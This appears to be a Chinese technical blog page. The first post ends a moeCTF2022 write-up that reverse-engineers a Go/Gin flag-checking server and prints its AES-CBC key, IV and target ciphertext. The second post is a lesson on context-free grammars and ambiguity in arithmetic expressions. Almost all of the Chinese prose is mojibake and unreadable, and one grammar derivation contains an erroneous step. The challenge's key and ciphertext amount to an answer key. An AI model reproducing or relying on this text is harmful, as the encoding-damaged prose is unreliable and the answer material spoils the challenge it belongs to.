runtime_slicebytetostring(v15, v13, v12, (<span class="built_in">string</span>)__PAIR128__((<span class="type">unsigned</span> <span class="type">int</span>)v10, v12));</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">96LL</span> )</span><br><span class="line">      runtime_memequal();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹æ¥æ˜¯main_checkå¹²äº†è¿™ä¹ˆå‡ ä»¶äº‹:</p>
<p>é¦–å…ˆå°†è¾“å…¥ä½¿ç”¨AESåŠ å¯†,ç„¶åå’Œäº‹å…ˆå­˜æ”¾å¥½çš„å¯†æ–‡å¯¹ç…§</p>
<p>AESåŠ å¯†ä¸­ä¸»è¦éœ€è¦ç¡®å®š(åŸæ–‡,å¯†é’¥,åç§»é‡,æ¨¡å¼)ç­‰ç­‰å˜é‡</p>
<p>å‰é¢æœ‰ä¸¤ä¸ª"---moeCTF2022---"å­—æ ·æ­£å¥½16å­—èŠ‚,è€Œå¯†é’¥å’Œåç§»é‡ä¹Ÿè¦æ±‚æ˜¯16å­—èŠ‚çš„,å› æ­¤å¯ä»¥æ¨æµ‹è¿™å°±æ˜¯å¯†é’¥å’Œåç§»é‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  qmemcpy(&amp;v23.cap, &quot;---moeCTF2022---&quot;, 16LL);</span><br><span class="line">...</span><br><span class="line">  qmemcpy(v4, &quot;---moeCTF2022---&quot;, 16LL);</span><br></pre></td></tr></table></figure>
<p>å¦‚ä½•ç¡®å®šæ¨¡å¼å‘¢?è¿›main_AesEncryptå‡½æ•°çœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// local variable allocation has failed, the output may be wrong!</span><br><span class="line">void __fastcall main_AesEncrypt(error_0 _r1, int a2, int a3, int a4, void *a5)</span><br><span class="line">...</span><br><span class="line">    crypto_cipher_NewCBCEncrypter(iv_8, v20, v15);</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æœ‰ä¸ª<code>crypto_cipher_NewCBCEncrypter</code>å‡½æ•°,å› æ­¤æ¨æµ‹ä½¿ç”¨CBCæ¨¡å¼</p>
<p>ç»¼ä¸Šæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™<a
target="_blank" rel="noopener" href="https://www.mklab.cn/utils/aes">AESåœ¨çº¿åŠ å¯†è§£å¯†å·¥å…· -
MKLabåœ¨çº¿å·¥å…·</a></p>
<p>è§£ä¸€ä¸‹å¯†</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111090020054.png"
alt="image-20221111090020054" />
<figcaption aria-hidden="true">image-20221111090020054</figcaption>
</figure>
<p>è¿˜çœŸå°±è§£å‡ºæ¥äº†</p>
<p>ä½†æ˜¯æ€»æ„Ÿè§‰è¿™æ ·æ˜¯ççŒ«ç¢°è§æ­»è€—å­,æ¨æµ‹çš„åœ°æ–¹å¤ªå¤šäº†,æ€ä¹ˆåˆæƒ…åˆç†åœ°æ¨æ–­å‘¢?</p>
<p>é¦–å…ˆè¦çŸ¥é“ç¨‹åºåˆ°åº•å¹²äº†å•¥?æ§åˆ¶ä»€ä¹ˆæ—¶å€™æ‰§è¡Œåˆ°main_flagHandler?å‚æ•°éƒ½æ˜¯ä»€ä¹ˆ?</p>
<h4 id="goæºä»£ç ">goæºä»£ç </h4>
<p>ä¸€çœ‹æºä»£ç ,æ€»å…±åŠ èµ·æ¥150è¡Œå·¦å³,å’±ä¹Ÿä¸çŸ¥é“idaæ€ä¹ˆå°±åç¼–è¯‘äº†è¿™ä¹ˆå¤š,è·Ÿè€å¤ªå¤ªè£¹è„šä¸€æ ·</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/lr.png"
alt="lr" />
<figcaption aria-hidden="true">lr</figcaption>
</figure>
<blockquote>
<p><code>Gin</code>æ˜¯ä¸€ä¸ªç”¨<code>Golang</code>ç¼–å†™çš„<code>Web</code>æ¡†æ¶ï¼Œ
æ˜¯ä¸€ä¸ªåŸºäº<code>Radix</code>æ ‘çš„è·¯ç”±ï¼Œå°å†…å­˜å ç”¨ï¼Œæ²¡æœ‰åå°„ï¼Œå¯é¢„æµ‹çš„<code>API</code>æ¡†æ¶ï¼Œé€Ÿåº¦æŒºé«˜äº†è¿‘40å€ï¼Œæ”¯æŒä¸­é—´ä»¶ã€è·¯ç”±ç»„å¤„ç†ã€JSONç­‰å¤šæ–¹å¼éªŒè¯ã€å†…ç½®äº†<code>JSON</code>ã€<code>XML</code>ã€<code>HTML</code>ç­‰æ¸²æŸ“ã€‚</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´serverè¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªgoè¯­è¨€Ginæ¡†æ¶æ­å»ºçš„åº”ç”¨å±‚webæœåŠ¡å™¨</p>
<h5 id="main">main</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := RouterInit(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	err := Run()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆè°ƒç”¨RouterInitå‡½æ•°,ç„¶åè°ƒç”¨Runå‡½æ•°</p>
<h5 id="routerinit">RouterInit</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RouterInit</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	gin.SetMode(<span class="string">&quot;release&quot;</span>)</span><br><span class="line">	engine = gin.Default()</span><br><span class="line">	engine.GET(<span class="string">&quot;/welcome&quot;</span>, welcomeHandler)</span><br><span class="line">	flagRouter := engine.Group(<span class="string">&quot;/find&quot;</span>)</span><br><span class="line">	flagRouter.Use(authRequired)</span><br><span class="line">	flagRouter.GET(<span class="string">&quot;/&quot;</span>, findHandler)</span><br><span class="line">	flagRouter.GET(<span class="string">&quot;/flag&quot;</span>, flagHandler)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé¢æ³¨å†Œäº†å¦‚æœæ”¶åˆ°GETæ–¹æ³•çš„æŠ¥æ–‡å¹¶ä¸”è´Ÿè½½æ˜¯"/welcome",åˆ™è°ƒç”¨welcomeHandlerå‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111091736911.png"
alt="image-20221111091736911" />
<figcaption aria-hidden="true">image-20221111091736911</figcaption>
</figure>
<p>ç„¶ååé¢å¹²äº†å•¥å‘¢?</p>
<p>ä¸Šç½‘æœäº†ä¸€ä¸‹,è¿™æ˜¯ä¸€ä¸ªåå«"è·¯ç”±"çš„æœºåˆ¶,æ¨æµ‹æ˜¯è¿™ä¹ˆä¸€ä¸ªæ„æ€:</p>
<p>å¯ä»¥è®¤ä¸º,engineå°±æ˜¯è®¿é—®<code>localhost:8080</code>ä¹‹åç«‹åˆ»å¾—åˆ°çš„é¡µé¢çš„</p>
<p>ç„¶å<code>/welcome</code>è¢«è·¯ç”±åˆ°welcomeHandlerå‡½æ•°,æ‰§è¡Œå®Œåå†è¿”å›engineå¯¹ä¸€ä¸ªä½ å¾—é¡µé¢</p>
<p>flagRouteræ˜¯ä¸€ä¸ªæ–°çš„è·¯ç”±,ä¹Ÿæ˜¯engineçš„å­è·¯ç”±,åªè¦æ˜¯<code>/find</code>è·¯ç”±åˆ†æ”¯,éƒ½ä¼šç”±engineè¿›å…¥flagRouterè·¯ç”±</p>
<p>ç„¶åç»™ä»–æ³¨å†Œäº†ä¸¤ä¸ªè·¯ç”±,å¦‚æœæ˜¯<code>/find/</code>å°±ä¼šè½¬åˆ°findHandler</p>
<p>å¦‚æœæ˜¯<code>/find/flag/</code>å°±ä¼šè½¬åˆ°flagHandler</p>
<p>å½“ç„¶è¿™é‡Œåªæ˜¯æ³¨å†Œ,ä¸ä¼šæ‰§è¡Œ,å®é™…ä¸Šæ‰§è¡Œæ˜¯åœ¨Runä¹‹å</p>
<h5 id="run">Run</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	log.Println(<span class="string">&quot;Service running at [127.0.0.1:8080]&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Type localhost:8080/welcome in your browser and open it&quot;</span>)</span><br><span class="line">	err := engine.Run(<span class="string">&quot;127.0.0.1:8080&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>engine.Runå°±åœ¨æœ¬æœºçš„8080ç«¯å£ä¸Šå¯åŠ¨HTTPæœåŠ¡äº†,æ­¤åç¨‹åºä¸€ç›´ç›‘å¬è¯¥ç«¯å£ä¸Šçš„å®¢æˆ·è¯·æ±‚.</p>
<p>æ ¹æ®RouterInitä¸­æ³¨å†Œçš„è·¯ç”±,å›åº”å®¢æˆ·çš„è¯·æ±‚,ç„¶åæ¢å¤åˆ°ç›‘å¬çŠ¶æ€å‡†å¤‡ä¸‹ä¸€ä¸ªå®¢æˆ·çš„è¯·æ±‚(æˆ–è€…ä¸€ä¸ªæ¥å¾…çº¿ç¨‹,ä¸€ä¸ªæœåŠ¡çº¿ç¨‹,åˆ°åº•æ€ä¹ˆå®ç°,ç°åœ¨ä¸å…³å¿ƒ)</p>
<h5 id="flaghandler">flagHandler</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flagHandler</span><span class="params">(ctx *gin.Context)</span></span> &#123;</span><br><span class="line">	flag = ctx.Query(<span class="string">&quot;flag&quot;</span>)<span class="comment">//è´Ÿè½½</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		ctx.JSON(<span class="number">400</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;please input your flag and I will check it&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		ctx.Abort()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !check(flag) &#123;</span><br><span class="line">		ctx.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;flag incorrect, please try again&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		ctx.Abort()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ctx.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;congratulations&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ctx.SetAccepted()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flagä»¥GETè´Ÿè½½çš„å½¢å¼ä¼ é€’ç»™åç«¯</p>
<p>ç„¶ååç«¯é¦–å…ˆå¯¹flagåˆ¤ç©º,ç„¶åè°ƒç”¨äº†checkæ£€æŸ¥flagçš„æ­£ç¡®æ€§</p>
<h5 id="check">check</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">(flag <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	encFlag := <span class="string">&quot;200c2c3ef00f31999df93d6919aa33e42dde307be02017ebf47067099ed0bddc525d5dba0f83c122159b89ae715907cc&quot;</span></span><br><span class="line">	key := []<span class="type">byte</span>(<span class="string">&quot;---moeCTF2022---&quot;</span>)</span><br><span class="line">	iv := []<span class="type">byte</span>(<span class="string">&quot;---moeCTF2022---&quot;</span>)</span><br><span class="line">	encrypt, err := AesEncrypt([]<span class="type">byte</span>(flag), key, iv)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> hex.EncodeToString(encrypt) == encFlag &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>checkä¸­å°±æ˜¯AesåŠ å¯†äº†,åŠ å¯†ä¹‹åçš„å¯†æ–‡å’ŒencFlagè¿™ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒ,å¦‚æœç›¸åŒåˆ™è¿”å›true,å†å›åˆ°flagHandlerä¸­è¿›å…¥elseå—</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	ctx.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;message&quot;</span>: <span class="string">&quot;congratulations&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°±ä¼šæ‰“å°æ­å–œå‘è´¢äº†</p>
<p>çœ‹æ¥è‡ªå·±å†™çš„å‡½æ•°,å¯¹åº”åˆ°ç¬¦å·è¡¨ä¸­çš„å‡½æ•°åéƒ½ä¼šåŠ ä¸Šmain_å‰ç¼€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111094105703.png"
alt="image-20221111094105703" />
<figcaption aria-hidden="true">image-20221111094105703</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/11/03/%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E5%85%88%E4%BF%AE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/03/%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E5%85%88%E4%BF%AE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/" class="post-title-link" itemprop="url">è¯­æ³•åˆ†æå…ˆä¿®-è¡¨è¾¾å¼æ±‚å€¼</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-03 11:09:00" itemprop="dateCreated datePublished" datetime="2022-11-03T11:09:00+08:00">2022-11-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-02-07 22:52:18" itemprop="dateModified" datetime="2023-02-07T22:52:18+08:00">2023-02-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è¯­æ³•åˆ†æ">è¯­æ³•åˆ†æ</h1>
<h2 id="ç®—æ•°è¡¨è¾¾å¼çš„ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•">ç®—æ•°è¡¨è¾¾å¼çš„ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•</h2>
<h3 id="å¹²ä»€ä¹ˆç”¨">å¹²ä»€ä¹ˆç”¨?</h3>
<p>æ•™æä¸­åœ¨è¯­æ³•åˆ†æä¸€ç« é¦–å…ˆæå‡ºçš„æ¦‚å¿µå°±æ˜¯ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•CFG</p>
<p>è¯­æ³•åˆ†æå™¨ä¸èƒ½æ²¡æœ‰CFG,æ­£å¦‚è¯æ³•åˆ†æå™¨ä¸èƒ½æ²¡æœ‰æ­£è§„å¼</p>
<p>ä¹Ÿå°±æ˜¯è¯´,æ¨¡å¼çš„å½¢å¼åŒ–æè¿°</p>
<p>æ­£è§„å¼è§„å®šæ­»äº†,ä¸€ç§è¯­è¨€å¯èƒ½ä½¿ç”¨çš„å•è¯æœ‰ä»€ä¹ˆ</p>
<p>CFGå°±æ˜¯è§„å®šæ­»äº†,ä¸€ç§è¯­è¨€å¯èƒ½ä½¿ç”¨çš„è¯­å¥æœ‰ä»€ä¹ˆ</p>
<p>CFGæ˜¯ä¸€ç§è¯­è¨€çš„èŒƒå¼,è€Œæ»¡è¶³è¿™ä¸ªCFGçš„ä¸€å¥è¯æ˜¯è¯¥ç§è¯­è¨€çš„å®ä¾‹</p>
<p>è¿™å°±å¥½æ¯”:è§„å®šæ±‰è¯­çš„è¯­å¥æ˜¯ç”±ä¸»è°“å®¾æ„æˆçš„,è¿™ç›¸å½“äºç«‹æ³•,å°±æ˜¯å®šä¹‰CFG</p>
<p>"æˆ‘åƒé¥­"å°±æ˜¯æ»¡è¶³æ³•å¾‹è¦æ±‚çš„:ä¸»(æˆ‘) è°“(åƒ)
å®¾(é¥­),è¿™å°±æ˜¯æ±‰è¯­è¯­å¥çš„ä¸€ä¸ªå®ä¾‹</p>
<p>åˆ¤æ–­"æˆ‘åƒé¥­"æ˜¯å¦åˆæ³•çš„è¿‡ç¨‹,å°±æ˜¯å°†ä¸€æ¡è¯­å¥å±•å¼€æˆå¤šä¸ªéƒ¨åˆ†çš„è¿‡ç¨‹,</p>
<p>åˆ¤æ–­ç¼–ç¨‹è¯­è¨€çš„ä¸€æ¡è¯­å¥æ˜¯å¦åˆæ³•,å°±å°è¯•ä½¿ç”¨CFGè§„å®šçš„è§„åˆ™æ¨å¯¼ä¹‹</p>
<h3 id="é•¿ä»€ä¹ˆæ ·">é•¿ä»€ä¹ˆæ ·?</h3>
<p>ä»¥åŸºæœ¬ç®—æ•°è¿ç®—ä¸ºä¾‹å­,åˆ†æä¸€ä¸ªå«æœ‰åŠ å‡ä¹˜é™¤æ‹¬å·çš„è¡¨è¾¾å¼,å…¶CFGå¦‚ä½•å®šä¹‰</p>
<p>CFGç”±ä¸€ä¸ªçŠ¶æ€å››å…ƒç»„(éç»ˆç»“ç¬¦é›†,ç»ˆç»“ç¬¦é›†,äº§ç”Ÿå¼é›†,å¼€å§‹ç¬¦å·)æ„æˆ</p>
æœ€åˆç²—æµ…çš„è€ƒè™‘æ˜¯è¿™æ ·çš„ $$
<span class="math display">\[\begin{aligned}
Context Free Grammar&amp;=(Nonterminals,Terminals,Productions,Start
Symbol)\\

&amp;\begin{cases}
Nonterminals=\{Expression\}\\
Terminals=\{+,\times,(,),id\}\\
StartSymbol=Expression\\
\begin{aligned}
Production&amp;:Expression\rightarrow\begin{cases}
Expression+ Expression\\
Expression\times Expression\\
(Expression)\\
-Expression\\
id
\end{cases}
\end{aligned}
\end{cases}
\end{aligned}\]</span>
<p>$$ â€‹
Nonterminalsé›†åˆä¸­åªæœ‰Expression,æ„æ€æ˜¯,åªè¦æ˜¯Expresionç¬¦å·,éƒ½å¯ä»¥ç»§ç»­æ¨å¯¼</p>
<p>â€‹
Terminalsé›†åˆä¸­æœ‰æ‰€æœ‰çš„è¿ç®—ç¬¦,è¿˜æœ‰ä¸€ä¸ªå­—é¢é‡id,è¿™æ„å‘³ç€,æ¨å¯¼åˆ°æœ€å…·ä½“çš„äº†,ä¸èƒ½å†å…·ä½“äº†</p>
<p>â€‹
StartSymbol=Expression,è¿™æ„å‘³ç€,æœ€å¼€å§‹çš„æ—¶å€™å°†æ•´ä¸ªè¯­å¥è§†ä¸ºä¸€ä¸ªè¡¨è¾¾å¼</p>
<h3 id="æ€ä¹ˆå¹²æ´»">æ€ä¹ˆå¹²æ´»?</h3>
<p>"é€šè¿‡æ¨å¯¼çš„æ–¹æ³•å¯ä»¥ä»CFGäº§ç”Ÿè¯­è¨€"</p>
<p>å®é™…ä¸Šå°±æ˜¯æ ¹æ®Productionäº§ç”Ÿå¼é›†ä¸­çš„åˆæ³•è§„åˆ™,å°†æŠ½è±¡çš„Expressionå…¨éƒ½æ›¿æ¢æˆå…·ä½“çš„idçš„è¿‡ç¨‹</p>
<p>å•¥æ„æ€å‘¢?ä¸¾ä¸ªä¾‹å­,æ¯”å¦‚å¯¹äº1+2+3,ä¸€å¼€å§‹çš„æ—¶å€™StartSymbol="1+2+3",è¿™ä¸ªæ•´ä½“æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼Expression
<span class="math display">\[
\begin{aligned}
exp(1+2+3)&amp;\rightarrow exp(1)+exp(2+3)\\
&amp;\rightarrow id(1)+exp(2)+exp(4)\\
&amp;\rightarrow id(1)+id(2)+id(3)
\end{aligned}
\]</span> è¿™å°±æ˜¯å·¦æ¨å¯¼çš„è¿‡ç¨‹,ä¹Ÿå°±æ˜¯åŒ–æŠ½è±¡ä¸ºå…·ä½“çš„è¿‡ç¨‹</p>
<h3 id="ä¸¥è°¨å—">ä¸¥è°¨å—?</h3>
<p>å‰é¢è¿™ç§å®šä¹‰CFGçš„æ–¹æ³•æ˜¯ä¸ä¸¥è°¨çš„,è¿™ä¹ˆè¯´çš„åŸå› æœ‰ä¸¤ä¸ª,</p>
<p>ä¸€æ˜¯æ˜¯æ²¡æœ‰ä½“ç°è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§,äºŒæ˜¯æ²¡æœ‰ä½“ç°è¿ç®—ç¬¦çš„ç»“åˆæ€§</p>
<h4 id="ä¼˜å…ˆçº§">ä¼˜å…ˆçº§</h4>
<p>ä¸¾ä¾‹<code>1+2*3</code></p>
<p>æŒ‰ç…§åŸæ¥çš„CFGå®šä¹‰,<span class="math inline">\(exp(1+2)\times
exp(3)\)</span>å’Œ<span class="math inline">\(exp(1)+exp(2\times
3)\)</span>ä¸¤ç§æ¨å¯¼è·¯çº¿éƒ½æ˜¯åˆæ³•çš„,è¿™å°±äº§ç”Ÿäº†äºŒä¹‰æ€§</p>
<h4 id="ç»“åˆæ€§">ç»“åˆæ€§</h4>
<p>ä¸¾ä¾‹<code>1+2+3</code></p>
<p>æŒ‰ç…§åŸæ¥çš„CFGå®šä¹‰,<span class="math inline">\(exp(1+2+3)\rightarrow
exp(1+2)+exp(3)\)</span>å’Œ<span
class="math inline">\(exp(1+2+3)\rightarrow
exp(1)+exp(2+3)\)</span>éƒ½æ˜¯åˆæ³•çš„,è¿™å°±äº§ç”Ÿäº†äºŒä¹‰æ€§</p>
<h4 id="æ¶ˆé™¤äºŒä¹‰æ€§">æ¶ˆé™¤äºŒä¹‰æ€§</h4>
å¦‚ä½•æ¶ˆé™¤äºŒä¹‰æ€§?ä¿è¯æ¯ä¸ªè¡¨è¾¾å¼åç»­çš„æ¨å¯¼,<strong>åªæœ‰å”¯ä¸€çš„è·¯çº¿</strong>
$$
<span class="math display">\[\begin{aligned}
Context Free Grammar&amp;=(Nonterminals,Terminals,Productions,Start
Symbol)\\

&amp;\begin{cases}
Nonterminals=\{Expression,Term,Factor\}\\
Terminals=\{+,\times,(,),id\}\\
StartSymbol=Expression\\
\begin{aligned}
Production\begin{cases}
    \begin{aligned}
    Expression&amp;\rightarrow Expression+Term\ |\ Term\\
    Term&amp;\rightarrow Term\times Factor\ | \ Factor\\
    Factor&amp;\rightarrow (Expression)\ |\ -Factor\ |\ id
    \end{aligned}
    \end{cases}
\end{aligned}
\end{cases}
\end{aligned}\]</span>
<p>$$ å¦‚ä½•ä½“ç°ä¼˜å…ˆçº§?</p>
<p><span
class="math inline">\(Expression\)</span>å…¨éƒ¨å±•å¼€ä¹‹åå¾—åˆ°çš„æ˜¯<span
class="math inline">\(Term1+Term2+Term3+...\)</span>åªæœ‰è¿™ä¸€ç§æƒ…å†µ,</p>
<p>ä¹Ÿå°±æ˜¯è¯´,å°†Expressionè§†ä¸ºè‹¥å¹²ä¹˜å¼çš„å’Œ,æ¯ä¸ªä¹˜å¼å†å„è‡ªè®¡ç®—è‡ªå·±çš„å€¼åä¸ŠæŠ¥ç»™åŠ æ³•.</p>
<p>æƒ³è¦è®¡ç®—åŠ æ³•å°±å¿…é¡»ç­‰æ‰€æœ‰çš„ä¹˜å¼è½å®ä¹‹åæ‰å¯ä»¥è¿›è¡Œ.è¿™å°±ä½“ç°äº†å…ˆä¹˜ååŠ çš„ä¼˜å…ˆçº§</p>
<p>å¦‚ä½•ä½“ç°ç»“åˆæ€§?</p>
<p><span class="math inline">\(Expression\rightarrow Expression+Term\ |
\ Term\)</span></p>
<p>è¿™æ„å‘³ç€,è¦è®¡ç®—é¡¶å±‚çš„åŠ æ³•,é¦–å…ˆéœ€è¦è®¡ç®—å­Expressionçš„å€¼,</p>
<p>è€Œå­Expressionç›¸å½“äºæ˜¯,é¡¶å±‚Expressionå°†æœ€å³ä¾§çš„<span
class="math inline">\(+Term\)</span>ç»™è¸¢å‡ºå».</p>
<p>è¿™å°±ä½“ç°äº†å·¦ç»“åˆ</p>
<blockquote>
<p>æ•™æä¸Šå°†ä¸Šè¿°ä¸¤ç‚¹å½’çº³:</p>
<p>1.å¼•å…¥æ–°çš„éç»ˆç»“ç¬¦,å¢åŠ ä¸€ä¸ªå­ç»“æ„å¹¶æé«˜ä¸€çº§ä¼˜å…ˆçº§</p>
<p>2.é€’å½’éç»ˆç»“ç¬¦åœ¨äº§ç”Ÿå¼ä¸­çš„ä½ç½®,ååº”æ–‡æ³•ç¬¦å·çš„ç»“åˆæ€§</p>
<p>è¿™ä¸ªå½’çº³çº¯ç²¹å±äºæ˜¯æ‡‚å¾—ä¸€çœ‹å°±æ‡‚,ä¸æ‡‚å¾—çœ‹äº†ä¹Ÿä¸æ‡‚çš„é‚£ç§</p>
<p>ç”šè‡³"é€’å½’éç»ˆç»“ç¬¦åœ¨äº§ç”Ÿå¼ä¸­çš„ä½ç½®"å•¥æ„æ€æˆ‘ä¹Ÿä¸æ‡‚</p>
</blockquote>
<blockquote>
<p>è¿™æ˜¯åœ¨ç®—æ•°è¡¨è¾¾å¼ä¸­æ¶ˆé™¤äºŒä¹‰æ€§,</p>
